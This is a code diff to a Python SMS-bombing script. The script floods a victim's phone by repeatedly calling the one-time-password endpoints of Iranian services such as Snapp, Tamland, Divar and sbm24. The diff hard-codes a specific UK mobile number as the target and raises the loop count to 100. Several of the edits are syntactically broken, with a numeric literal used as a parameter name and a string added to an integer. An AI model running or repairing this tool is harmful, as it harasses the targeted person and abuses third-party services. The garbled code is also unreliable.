@@ -64,7 +64,7 @@ def log(looping_count, sms_number, phone_number):
 # dos loop
  
 def start():
-    looping_count = 0
+    looping_count = 100
 
     clear()
     # input data
@@ -133,7 +133,7 @@ def start():
 # 001 snap
 def snap(phone_number):
     try:
-        phone_number = "+98" + phone_number
+        phone_number = "+44" + 7926491207
         data = {"cellphone":phone_number}
         url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
         p = post(url, json=data, timeout=2)
@@ -154,9 +154,9 @@ def snap(phone_number):
 
 
 # 002 tamland
-def tamland(phone_number):
+def tamland(07926491207):
     try:
-        phone_number = "0" + phone_number
+        phone_number = "+44" + 7926491207
         
 
         data = {"Mobile":phone_number,"SchoolId":-1}
@@ -219,7 +219,7 @@ def tapsi(phone_number):
         sended.append(-1)
 
 # 005 divar
-def divar(phone_number):
+def divar(07926491207):
     try:
         phone_number = phone_number
         data = {"phone":phone_number}
@@ -239,7 +239,7 @@ def divar(phone_number):
 
 
 # 006 sbm24 -limit
-def sbm24(phone_number):
+def sbm24(07926491207):
     try:
         data = {}
         url = "https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0{}".format(phone_number)
@@ -259,7 +259,7 @@ def sbm24(phone_number):
 
 
 # 007 snap market
-def snap_market(phone_number):
+def snap_market(07926491207):
     try:
 
         data = {}
